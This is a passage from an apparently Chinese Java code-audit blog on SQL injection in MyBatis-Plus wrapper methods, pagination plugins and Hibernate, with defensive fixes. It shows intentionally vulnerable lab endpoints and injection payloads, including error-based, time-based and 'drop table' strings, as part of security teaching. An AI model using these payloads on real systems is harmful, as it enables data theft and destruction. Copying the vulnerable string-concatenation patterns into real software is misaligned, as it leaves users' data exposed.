class="hljs-variable">employee</span> <span class="hljs-operator">=</span> employeeMapper.selectOne(wrapper);  <br>    <span class="hljs-comment">// 返回查询结果</span><br>    <span class="hljs-keyword">return</span> employee;  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接看到这里的参数传入是直接拼接的，存在sql注入漏洞</p><p>但是由于selectOne函数的存在(只返回一条符合条件的记录)，这里只能进行报错注入，万能密码会返回全部数据，由于特殊函数限制，无法注入成功</p><h4 id="apply场景的防护"><a href="#apply场景的防护" class="headerlink" title="apply场景的防护"></a>apply场景的防护</h4><p>在语句后加上参数占位符{0}即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpSec02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpSec02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.apply(<span class="hljs-string">&quot;id=&#123;0&#125;&quot;</span>,id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="last方法产生的sql注入"><a href="#last方法产生的sql注入" class="headerlink" title="last方法产生的sql注入"></a>last方法产生的sql注入</h3><p>last()方法重写后有两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">last(String lastSql)<br>last(<span class="hljs-type">boolean</span> condition, String lastSql)<br></code></pre></td></tr></table></figure><p>此方法中lastSql可以直接用来编写SQL语句，写一个新接口</p><p>猜测实战黑盒利用场景为在线sql语句执行程序，可以编写新接口进行渗透</p><p>这里直接使用Drunkbaby师傅的漏洞环境</p><p>项目地址：[JavaSecurityLearning&#x2F;JavaSecurity&#x2F;Java 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli at main · Drun1baby&#x2F;JavaSecurityLearning (github.com)](<a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Java</a> 代码审计&#x2F;CodeReview&#x2F;JavaSec-Code&#x2F;MybatisPluSqli)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/last&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln03</span><span class="hljs-params">( String id)</span> &#123;<br>        QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();<br>        wrapper.last(<span class="hljs-string">&quot;order by &quot;</span> + id);<br>        <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);<br>    &#125;<br></code></pre></td></tr></table></figure><p>启动环境时出现报错</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A501.png" alt="图片"></p><p>在MybatisPluSqliApplication.java文件加上一行代码即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br></code></pre></td></tr></table></figure><p>文件全部</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby;<br><br><span class="hljs-keyword">import</span> org.mybatis.spring.annotation.MapperScan;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@MapperScan(&quot;com.drunkbaby.mapper&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPluSqliApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MybatisPluSqliApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>实操后发现不需要payload也是直接爆出所有数据的</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A502.png" alt="图片"></p><p>可能是我的操作出了什么问题，但是本来控制代码就不是很多，感觉应该是没有问题的</p><p>正常payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8081/mybatis_plus/last?id=1%20or%201=1<br></code></pre></td></tr></table></figure><h4 id="order-by相关的sql注入"><a href="#order-by相关的sql注入" class="headerlink" title="order by相关的sql注入"></a>order by相关的sql注入</h4><p>刚开始想要搭这个环境的主要原因是没见过order by后拼接万能密码的</p><p>再次复习了一下order by相关</p><p>在 SQL 中，<code>ORDER BY</code> 子句用于对查询结果进行排序。<code>ORDER BY</code> 后的参数有以下要求和注意事项：</p><ol><li>列名或别名</li></ol><ul><li><p>可以使用表中的列名或查询中定义的列别名。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age;<br></code></pre></td></tr></table></figure></li></ul><ol start="2"><li>列的序号(sql注入中常用于判断列数)</li></ol><ul><li><p>可以使用 SELECT 子句中列的序号（从 1 开始）。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-number">2</span>; <span class="hljs-comment">-- 按第二列 age 排序</span><br></code></pre></td></tr></table></figure></li></ul><ol start="3"><li>排序方式</li></ol><ul><li><p>默认是升序（<code>ASC</code>），也可以显式指定。</p></li><li><p>降序使用 <code>DESC</code>。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p> 4.多个排序条件</p></li><li><p>可以指定多个列，按优先级依次排序。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age, grade <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade <span class="hljs-keyword">DESC</span>, age <span class="hljs-keyword">ASC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="5"><li>表达式或计算结果</li></ol><ul><li><p>可以使用表达式或计算结果进行排序。</p></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, salary, bonus <span class="hljs-keyword">FROM</span> employees <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> (salary <span class="hljs-operator">+</span> bonus) <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure></li></ul><ol start="6"><li>NULL 值排序</li></ol><ul><li><p>不同数据库对 </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p> 的排序处理可能不同：</p><ul><li>一般情况下，<code>NULL</code> 在升序中排在最前，在降序中排在最后。</li><li>可以使用 <code>NULLS FIRST</code> 或 <code>NULLS LAST</code> 明确指定。</li></ul></li><li><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, age <span class="hljs-keyword">FROM</span> students <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> age <span class="hljs-keyword">ASC</span> <span class="hljs-keyword">NULLS LAST</span>;<br></code></pre></td></tr></table></figure></li></ul><p>注意事项：</p><ul><li>列必须存在：<code>ORDER BY</code> 中引用的列或别名必须在查询结果中有效。</li><li>性能影响：排序操作可能会影响查询性能，尤其是大数据集时。</li></ul><p>并且order by语句后无法拼接变量，但是可以拼接sql语句，如果万能密码能够使用，猜测是被当作sql语句执行</p><h3 id="exists-notExists-拼接产生的SQL-注入"><a href="#exists-notExists-拼接产生的SQL-注入" class="headerlink" title="exists&#x2F;notExists 拼接产生的SQL 注入"></a>exists&#x2F;notExists 拼接产生的SQL 注入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln04&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln04</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.exists(<span class="hljs-string">&quot;select * from employees where id = &quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="having-语句"><a href="#having-语句" class="headerlink" title="having 语句"></a>having 语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/mpVuln06&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">mpVuln06</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().groupBy(<span class="hljs-string">&quot;id&quot;</span>).having(<span class="hljs-string">&quot;id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="order-by-语句-写order-by-的时候不能预编译，下面有一个模块详细讲解"><a href="#order-by-语句-写order-by-的时候不能预编译，下面有一个模块详细讲解" class="headerlink" title="order by 语句(写order by 的时候不能预编译，下面有一个模块详细讲解)"></a>order by 语句(写order by 的时候不能预编译，下面有一个模块详细讲解)</h3><p>相关接口写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby01</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderBy(<span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby02&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby02</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByAsc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br><br><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/orderby03&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">orderby03</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().orderByDesc(id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="group-By-order-by"><a href="#group-By-order-by" class="headerlink" title="group By&#x2F;order by"></a>group By&#x2F;order by</h3><h3 id="inSql-notInSql"><a href="#inSql-notInSql" class="headerlink" title="inSql&#x2F;notInSql"></a>inSql&#x2F;notInSql</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/insql&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">inSql</span><span class="hljs-params">( String id)</span> &#123;  <br>    QueryWrapper&lt;Employee&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> wrapper.select().inSql(id, <span class="hljs-string">&quot;select * from employees where id &gt;&quot;</span> + id);  <br> <span class="hljs-keyword">return</span> employeeMapper.selectList(wrapper);  <br>&#125;<br></code></pre></td></tr></table></figure><p>这几种方法都是不支持预编译绑定参数，会直接将字符串拼接到最终 SQL 末尾**，**不会做任何参数绑定或转义处理。导致攻击者传入恶意代码造成语句拼接，用户信息泄露。</p><h3 id="分页插件的-SQL-注入情况"><a href="#分页插件的-SQL-注入情况" class="headerlink" title="分页插件的 SQL 注入情况"></a>分页插件的 SQL 注入情况</h3><h4 id="分页插件自带的-addOrder-方法"><a href="#分页插件自带的-addOrder-方法" class="headerlink" title="分页插件自带的 addOrder() 方法"></a>分页插件自带的 <code>addOrder()</code> 方法</h4><ul><li><p>配置分页插件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.drunkbaby.config;  <br>  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;  <br><span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;  <br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;  <br>  <br><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisPlusConfig</span> &#123;  <br>  <br>    <span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * 注册插件  </span><br><span class="hljs-comment"> */</span>  <br> <span class="hljs-meta">@Bean</span>  <br> <span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> &#123;  <br>  <br>        <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();  <br> <span class="hljs-comment">// 添加分页插件  </span><br> <span class="hljs-type">PaginationInnerInterceptor</span> <span class="hljs-variable">pageInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>();  <br> <span class="hljs-comment">// 设置请求的页面大于最大页后操作，true调回到首页，false继续请求。默认false  </span><br> pageInterceptor.setOverflow(<span class="hljs-literal">false</span>);  <br> <span class="hljs-comment">// 单页分页条数限制，默认无限制  </span><br> pageInterceptor.setMaxLimit(<span class="hljs-number">500L</span>);  <br> <span class="hljs-comment">// 设置数据库类型  </span><br> pageInterceptor.setDbType(DbType.MYSQL);  <br>  <br> interceptor.addInnerInterceptor(pageInterceptor);  <br> <span class="hljs-keyword">return</span> interceptor;  <br> &#125;    <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>漏洞接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/mybatis_plus/PageVul01&quot;)</span>  <br><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title function_">mybatisPlusPageVuln01</span><span class="hljs-params">(Long page, Long size, String id)</span>&#123;  <br>    QueryWrapper&lt;Person&gt; queryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();  <br> Page&lt;Person&gt; personPage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);  <br> personPage.addOrder(OrderItem.asc(id));  <br> IPage&lt;Person&gt; iPage= personMapper.selectPage(personPage, queryWrapper);  <br> List&lt;Person&gt; people = iPage.getRecords();  <br> <span class="hljs-keyword">return</span> people;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>Page&lt;Person&gt; personPage = new Page&lt;&gt;(1,2);</code> 的参数由自己定义</p><p>这里对应的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e)))<br><br>// 或者是<br>?id=1&#x27; and sleep(5)<br></code></pre></td></tr></table></figure><p>必须是通过盲注的形式，如果是普通的注入，是不会有回显的；因为这里分页查找，size 就把你的数据数量限定死了，如果超过这个数据就会报错，所以只能盲注。</p></li></ul><h4 id="pagehelper"><a href="#pagehelper" class="headerlink" title="pagehelper"></a>pagehelper</h4><p>这里的原理就和 order by 一样，不赘述了</p><p>因为Order by排序时不能进行预编译处理，所以在使用插件时需要额外注意如下function，同样会存在SQL注入风险：</p><ul><li>com.github.pagehelper.Page<ul><li>主要是setOrderBy(java.lang.String)方法</li></ul></li><li>com.github.pagehelper.page.PageMethod<ul><li>主要是startPage(int,int,java.lang.String)方法</li></ul></li><li>com.github.pagehelper.PageHelper<ul><li>主要是startPage(int,int,java.lang.String)方法</li></ul></li></ul><h2 id="mybatis-Plus-SQL-注入的修复"><a href="#mybatis-Plus-SQL-注入的修复" class="headerlink" title="mybatis Plus SQL 注入的修复"></a>mybatis Plus SQL 注入的修复</h2><p>以上列出的所有方法，除了apply方法可以使用参数占位符进行防护，其他方法全部不支持预编译绑定参数，会直接将字符串拼接到最终 SQL 末尾**，**不会做任何参数绑定或转义处理。导致攻击者传入恶意代码造成语句拼接，用户信息泄露。</p><p>能想到的防护方法只有对传入的参数进行检测和过滤</p><p>还有写Filter进行过滤</p><p>过滤器集成：<a href="https://github.com/Drun1baby/AWD-AWDP_SecFilters">Drun1baby&#x2F;AWD-AWDP_SecFilters: 为了准备 AWD，写了个 Filter 的集合 (github.com)</a></p><h2 id="Hibernate框架下的SQL注入"><a href="#Hibernate框架下的SQL注入" class="headerlink" title="Hibernate框架下的SQL注入"></a>Hibernate框架下的SQL注入</h2><p> Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。</p><p>一般是默认进行预编译的</p><p>Hibernate可以使用hql来执行SQL语句，也可以直接执行SQL语句，无论是哪种方式都有可能导致SQL注入</p><h3 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h3><p>hql语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hql">String hql = &quot;from People where username = &#x27;&quot; + username + &quot;&#x27; and password = &#x27;&quot; + password + &quot;&#x27;&quot;;<br></code></pre></td></tr></table></figure><p>这种拼接方式存在SQL注入</p><p>正确使用以下几种HQL参数绑定的方式可以有效避免注入的产生：</p><p>1.命名参数（named parameter）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = :name&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>, parameter);<br></code></pre></td></tr></table></figure><p>2.位置参数（Positional parameter）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-number">1</span>, parameter);<br></code></pre></td></tr></table></figure><p>3.命名参数列表（named parameter list）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">&quot;g1ts&quot;</span>, <span class="hljs-string">&quot;g2ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name in (:names)&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;names&quot;</span>, names);<br></code></pre></td></tr></table></figure><p>4.类实例（JavaBean）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">user1.setName(<span class="hljs-string">&quot;g1ts&quot;</span>);<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users where name =:name&quot;</span>, User.class);<br>query.setProperties(user1);<br></code></pre></td></tr></table></figure><p>5.HQL拼接方法</p><p> 这种方式是最常用，而且容易忽视且容易被注入的，通常做法就是对参数的特殊字符进行过滤，推荐大家使用 Spring工具包的StringEscapeUtils.escapeSql()方法对参数进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.lang.StringEscapeUtils;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringEscapeUtils.escapeSql(<span class="hljs-string">&quot;&#x27;&quot;</span>);<br>  System.out.println(str);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>Hibernate支持使用原生SQL语句执行，所以其风险和JDBC是一致的，直接使用拼接的方法时会导致SQL注入</p><p>语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Query&lt;People&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p>正确写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createNativeQuery(<span class="hljs-string">&quot;select * from user where name = :name&quot;</span>);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>,parameter);<br></code></pre></td></tr></table></figure><h2 id="预编译下的sql注入"><a href="#预编译下的sql注入" class="headerlink" title="预编译下的sql注入"></a>预编译下的sql注入</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>预编译是将sql语句参数化，可预编译的语句，如 where语句中的内容是被参数化的。这就是说，预编译仅仅只能防御住可参数化位置的sql注入。那么，对于不可参数化的位置，预编译将没有任何办法。</p><p>不可参数化的位置：</p><ol><li>表名、列名</li><li>order by、group by</li><li>limit</li><li>join</li><li>等</li></ol><p>我们以order by举例，现在有一个sql语句如下（以下均为伪代码）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY &#123;user_input&#125;;<br></code></pre></td></tr></table></figure><p>其中user_input是传递过来的参数，例如 id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;<br></code></pre></td></tr></table></figure><p>这个语句是没有问题的，但是如果user_input输入为 id;drop table users –</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;drop table users --+<br></code></pre></td></tr></table></figure><p>这样就被成功注入了，而这种位置是不可被参数化的，所以是无法通过预编译防御的</p><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><p>所以，对于sql注入存在两种情况，可参数化的，不可参数化的。</p><p>对于可参数化没商量，直接预编译解决一切。</p><p>而对于不可参数化的，只能通过设置白名单，过滤特殊符号，通过加引号强制转为字符串等方式进行拦截。</p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-24813 RCE复现</title>
    <link href="/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/</url>
    
